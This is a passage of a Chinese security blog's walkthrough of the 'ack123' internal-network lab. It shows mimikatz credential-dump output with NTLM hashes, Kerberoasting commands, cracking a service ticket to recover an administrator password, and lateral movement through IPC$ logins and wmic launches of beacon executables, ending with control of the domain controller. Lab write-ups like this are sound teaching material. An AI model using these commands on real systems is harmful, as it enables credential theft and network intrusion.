</span><br><span class="line">	 * Username : 12SERVER-WEB2$</span><br><span class="line">	 * Domain   : ACK123</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : 12server-web2$</span><br><span class="line">	 * Domain   : ACK123.COM</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 68611 (00000000:00010c03)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022&#x2F;3&#x2F;7 22:30:53</span><br><span class="line">SID               : S-1-5-90-1</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : 12SERVER-WEB2$</span><br><span class="line">	 * Domain   : ACK123</span><br><span class="line">	 * NTLM     : 69478339633f30c7da5a2d2da43dc45c</span><br><span class="line">	 * SHA1     : d66cf9670ed5b1daf954aefa5648c632440784af</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : 12SERVER-WEB2$</span><br><span class="line">	 * Domain   : ACK123</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : 12SERVER-WEB2$</span><br><span class="line">	 * Domain   : ack123.com</span><br><span class="line">	 * Password : 27 07 53 e1 49 00 9f d2 2c e2 6f d2 ca 7c ed f8 c0 2a de b1 5a 5d 56 1c 46 dd 2a e6 42 a5 39 32 7f 64 ba 89 0c 50 b2 f0 c8 c1 c5 d0 9b 31 a9 5d 02 70 1b 5a 83 4f 6e 0b 38 1f 08 c8 0f a0 33 e5 0e 04 ea ae d4 d5 23 19 30 4e 5d 9a 07 32 eb 9c 5e 9e 43 1f b1 4c 6e 03 f1 aa af b6 33 1d bc 0d 66 b8 19 8b 27 c3 c8 d2 14 af 83 d3 43 14 b4 c6 cb e3 3b ec f7 11 02 50 63 8d 07 a7 ef 3f 2e d1 39 9e b9 3c c5 d3 b3 50 2e c1 31 1c 79 03 68 0c 28 0a 61 83 0c 7d 6c 67 56 cd 70 b6 6c 75 07 6c f7 22 4d 4f 72 ab 3b 16 e0 d7 81 f1 34 0d ff 37 4e 12 6b 7d cd eb 87 a1 a7 a0 de d5 cc 9a 4b ab a0 dd 59 90 c8 f5 57 a5 97 3f 1a 99 2b a0 ac 92 11 dc bb 9d fa 51 9d 18 cd 05 e6 71 01 f8 9c b0 05 4b a5 2e ad 93 94 16 98 58 40 26 ee 44 98 51 </span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022&#x2F;3&#x2F;7 22:30:53</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">	msv :	</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : (null)</span><br><span class="line">	 * Domain   : (null)</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : (null)</span><br><span class="line">	 * Domain   : (null)</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 44521 (00000000:0000ade9)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022&#x2F;3&#x2F;7 22:30:53</span><br><span class="line">SID               : </span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : 12SERVER-WEB2$</span><br><span class="line">	 * Domain   : ACK123</span><br><span class="line">	 * NTLM     : 69478339633f30c7da5a2d2da43dc45c</span><br><span class="line">	 * SHA1     : d66cf9670ed5b1daf954aefa5648c632440784af</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	kerberos :	</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : 12SERVER-WEB2$</span><br><span class="line">Domain            : ACK123</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022&#x2F;3&#x2F;7 22:30:53</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">	msv :	</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : 12SERVER-WEB2$</span><br><span class="line">	 * Domain   : ACK123</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : 12server-web2$</span><br><span class="line">	 * Domain   : ACK123.COM</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="./ack123/60.png" alt></p>
+<h4 id="SPN攻击"><a href="#SPN攻击" class="headerlink" title="SPN攻击"></a>SPN攻击</h4><ul>
+<li>首先进程注入到域内的进程</li>
+</ul>
+<p><img data-src="./ack123/61.png" alt></p>
+<p><img data-src="./ack123/62.png" alt></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ask /target:mysql/16server-dc1.ack123.com</span><br><span class="line">mimikatz kerberos::list</span><br><span class="line">mimikatz kerberos::list /export</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="./ack123/63.png" alt></p>
+<p><img data-src="./ack123/64.png" alt></p>
+<p><img data-src="./ack123/65.png" alt></p>
+<p><img data-src="./ack123/66.png" alt></p>
+<ul>
+<li>破解</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">python3 tgsrepcrack.py /usr/share/wordlists/fasttrack.txt 1-40a10000-web2@mysql\~16server-dc1.ack123.com-ACK123.COM.kirbi</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\kalifile\kerberoast&gt; python3 tgsrepcrack.py /usr/share/wordlists/fasttrack.txt 1-40a10000-web2@mysql\~16server-dc1.ack123.com-ACK123.COM.kirbi </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    USE HASHCAT, IT'S HELLA FASTER!!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Cracking 1 tickets...</span><br><span class="line">found password for ticket 0: P@55w0rd!  File: 1-40a10000-web2@mysql~16server-dc1.ack123.com-ACK123.COM.kirbi</span><br><span class="line">Successfully cracked all tickets</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="内网data2服务"><a href="#内网data2服务" class="headerlink" title="内网data2服务"></a>内网data2服务</h3><ul>
+<li>目前状态</li>
+</ul>
+<p><img data-src="./ack123/67.png" alt></p>
+<ul>
+<li><code>ipc</code>登录 <code>10.10.10.136</code></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shell net use \\10.10.10.136\ipc$ /user:administrator "P@55w0rd!" </span><br><span class="line"></span><br><span class="line">shell copy c:\beacon2.exe \\10.10.10.136\c$\beacon2.exe</span><br><span class="line"></span><br><span class="line">shell wmic /node:10.10.10.136 /user:ack123\administrator /password:P@55w0rd! process call create c:\beacon2.exe</span><br><span class="line"></span><br><span class="line">connect 10.10.10.136 6677</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="./ack123/68.png" alt></p>
+<ul>
+<li>制作正向后门</li>
+</ul>
+<p><img data-src="./ack123/69.png" alt></p>
+<ul>
+<li>制作后门并上传到data2 &amp;&amp; 执行</li>
+</ul>
+<p><img data-src="./ack123/70.png" alt></p>
+<ul>
+<li>连接正向后门 ok</li>
+</ul>
+<p><img data-src="./ack123/71.png" alt></p>
+<ul>
+<li>增加转发</li>
+</ul>
+<p><img data-src="./ack123/72.png" alt></p>
+<h3 id="域服务器"><a href="#域服务器" class="headerlink" title="域服务器"></a>域服务器</h3><ul>
+<li>同理，创建反向木马连接</li>
+</ul>
+<p><img data-src="./ack123/73.png" alt></p>
+<p><img data-src="./ack123/74.png" alt></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shell net use \\10.10.10.135\ipc$ /user:administrator "P@55w0rd!"</span><br><span class="line"></span><br><span class="line">shell copy c:\beacon444.exe \\10.10.10.135\c$\beacon444.exe</span><br><span class="line"></span><br><span class="line">shell wmic /node:10.10.10.135 /user:ack123\administrator /password:P@55w0rd! process call create c:\beacon444.exe</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>域控上线</li>
+</ul>
+<p><img data-src="./ack123/75.png" alt></p>
+<p><img data-src="./ack123/76.png" alt></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 内网渗透测试</a>
+              <a href="/tags/%E5%8D%95%E5%85%B5%E8%83%BD%E5%8A%9B/" rel="tag"># 单兵能力</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/02/20/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Nagini/" rel="prev" title="Nagini">
+      <i class="fa fa-chevron-left"></i> Nagini
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/04/17/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/NASA/" rel="next" title="NASA">
+      NASA <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ack123"><span class="nav-number">1.</span> <span class="nav-text">ack123</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#简介"><span class="nav-number">1.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基础环境"><span class="nav-number">1.2.</span> <span class="nav-text">基础环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#测试步骤"><span class="nav-number">1.3.</span> <span class="nav-text">测试步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#暴露公网web服务"><span class="nav-number">1.3.1.</span> <span class="nav-text">暴露公网web服务</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#web信息"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">web信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#后台rce"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">后台rce</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#提权"><span class="nav-number">1.3.1.3.</span> <span class="nav-text">提权</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#站库分离data1"><span class="nav-number">1.3.2.</span> <span class="nav-text">站库分离data1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#敏感信息-amp-amp-权限"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">敏感信息&amp;&amp;权限</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#提权-1"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#横向"><span class="nav-number">1.3.2.3.</span> <span class="nav-text">横向</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#内网隧道"><span class="nav-number">1.3.2.4.</span> <span class="nav-text">内网隧道</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#内网web2服务"><span class="nav-number">1.3.3.</span> <span class="nav-text">内网web2服务</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#hachcat破解jwt-token"><span class="nav-number">1.3.3.1.</span> <span class="nav-text">hachcat破解jwt_token</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phpMyAdmin拿到shell"><span class="nav-number">1.3.3.2.</span> <span class="nav-text">phpMyAdmin拿到shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#域内信息收集"><span class="nav-number">1.3.3.3.</span> <span class="nav-text">域内信息收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SPN攻击"><span class="nav-number">1.3.3.4.</span> <span class="nav-text">SPN攻击</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#内网data2服务"><span class="nav-number">1.3.4.</span> <span class="nav-text">内网data2服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#域服务器"><span class="nav-number">1.3.5.</span> <span class="nav-text">域服务器</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="菜心"
+      src="/images/avatar1.gif">
+  <p class="site-author-name" itemprop="name">菜心</p>
+  <div class="site-description" itemprop="description">目标&&付出</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">195</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">49</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">124</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+      
+        <script type="text/javascript" charset="utf-8" src="/js/tagcloud.js"></script>
+        <script type="text/javascript" charset="utf-8" src="/js/tagcanvas.js"></script>
+        <div class="widget-wrap">
+            <h3 class="widget-title">Tag Cloud</h3>
+            <div id="myCanvasContainer" class="widget tagcloud">
+                <canvas width="250" height="250" id="resCanvas" style="width=100%">
+                    <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/git%E6%B3%84%E9%9C%B2/" rel="tag">.git泄露</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/user-ini%E6%96%87%E4%BB%B6/" rel="tag">.user.ini文件</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BB%95%E8%BF%87/" rel="tag">==绕过</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Beelzebub/" rel="tag">Beelzebub</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Bluesmoke/" rel="tag">Bluesmoke</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Book-shelf/" rel="tag">Book-shelf</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/BoredHackerBlog/" rel="tag">BoredHackerBlog</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE/" rel="tag">CVE</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Corrosion/" rel="tag">Corrosion</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DC/" rel="tag">DC</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DDE/" rel="tag">DDE</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWA/" rel="tag">DVWA</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DarkHole/" rel="tag">DarkHole</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Deathnote/" rel="tag">Deathnote</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Dos%E6%94%BB%E5%87%BB/" rel="tag">Dos攻击</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Empire/" rel="tag">Empire</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Excel/" rel="tag">Excel</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Git/" rel="tag">Git</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HarryPotter/" rel="tag">HarryPotter</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Heist/" rel="tag">Heist</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ICA/" rel="tag">ICA</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Jangow/" rel="tag">Jangow</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/KB-VULN/" rel="tag">KB-VULN</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MD5%E7%BB%95%E8%BF%87/" rel="tag">MD5绕过</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Matrix/" rel="tag">Matrix</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Matrix-Breakout-2-Morpheus/" rel="tag">Matrix-Breakout 2_Morpheus</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Napping/" rel="tag">Napping</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/NoSQL%E6%B3%A8%E5%85%A5/" rel="tag">NoSQL注入</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Red/" rel="tag">Red</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSTI/" rel="tag">SSTI</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Thales/" rel="tag">Thales</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/The-Planets/" rel="tag">The Planets</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/URL%E9%87%8D%E5%AE%9A%E5%90%91/" rel="tag">URL重定向</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web-Machine/" rel="tag">Web Machine</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XFF/" rel="tag">XFF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XFF%E7%BB%95%E8%BF%87/" rel="tag">XFF绕过</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XXE/" rel="tag">XXE</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/binwalk/" rel="tag">binwalk</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cookie%E7%99%BB%E5%BD%95/" rel="tag">cookie登录</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/doubletrouble/" rel="tag">doubletrouble</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/flask-ssti/" rel="tag">flask ssti</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/flask-session%E7%A0%B4%E8%A7%A3/" rel="tag">flask_session破解</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz%E6%B5%8B%E8%AF%95/" rel="tag">fuzz测试</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hackme/" rel="tag">hackme</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hackme2/" rel="tag">hackme2</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hacksudo/" rel="tag">hacksudo</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hash-hmac-sha256%E7%BB%95%E8%BF%87/" rel="tag">hash_hmac_sha256绕过</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/home/" rel="tag">home</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/http%E5%8D%8F%E8%AE%AE/" rel="tag">http协议</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nginx/" rel="tag">nginx</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/others/" rel="tag">others</a><span class="tag-list-count">10</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" rel="tag">php伪协议</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">php反序列化</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/" rel="tag">php变量覆盖</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83/" rel="tag">php弱类型比较</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">php文件包含</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/" rel="tag">php无参数RCE</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python%E5%87%BD%E6%95%B0/" rel="tag">python函数</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python%E5%88%97%E8%A1%A8%E3%80%81%E5%85%83%E7%BB%84%E3%80%81%E5%AD%97%E5%85%B8%E5%92%8C%E9%9B%86%E5%90%88/" rel="tag">python列表、元组、字典和集合</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B%E5%92%8C%E8%BF%90%E7%AE%97%E7%AC%A6/" rel="tag">python变量类型和运算符</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python%E5%AD%97%E7%AC%A6%E4%B8%B2-%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/" rel="tag">python字符串&&流程控制</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python%E5%B9%B6%E5%8F%91/" rel="tag">python并发</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python%E7%B1%BB%E5%92%8C%E5%AF%B9%E8%B1%A1/" rel="tag">python类和对象</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python%E7%B1%BB%E7%9A%84%E7%89%B9%E6%AE%8A%E6%88%90%E5%91%98-%E5%B1%9E%E6%80%A7-%E6%96%B9%E6%B3%95/" rel="tag">python类的特殊成员(属性&方法)</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python%E8%AF%AD%E6%84%9F/" rel="tag">python语感</a><span class="tag-list-count">10</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/regex/" rel="tag">regex</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/robots-txt/" rel="tag">robots.txt</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ruby-web-%E6%B3%A8%E5%85%A5/" rel="tag">ruby web 注入</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sha%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E7%BB%95%E8%BF%87/" rel="tag">sha弱类型比较绕过</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shenron/" rel="tag">shenron</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shopxocms/" rel="tag">shopxocms</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssti/" rel="tag">ssti</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/strcmp%E7%BB%95%E8%BF%87/" rel="tag">strcmp绕过</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/supervisor/" rel="tag">supervisor</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/symfonos/" rel="tag">symfonos</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tornado/" rel="tag">tornado</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/unicode/" rel="tag">unicode</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/y0usef/" rel="tag">y0usef</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" rel="tag">一句话木马</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">任意命令执行</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%85%A5%E9%97%A8/" rel="tag">入门</a><span class="tag-list-count">91</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">内网渗透测试</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%89%8D%E7%AB%AF%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" rel="tag">前端信息泄露</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" 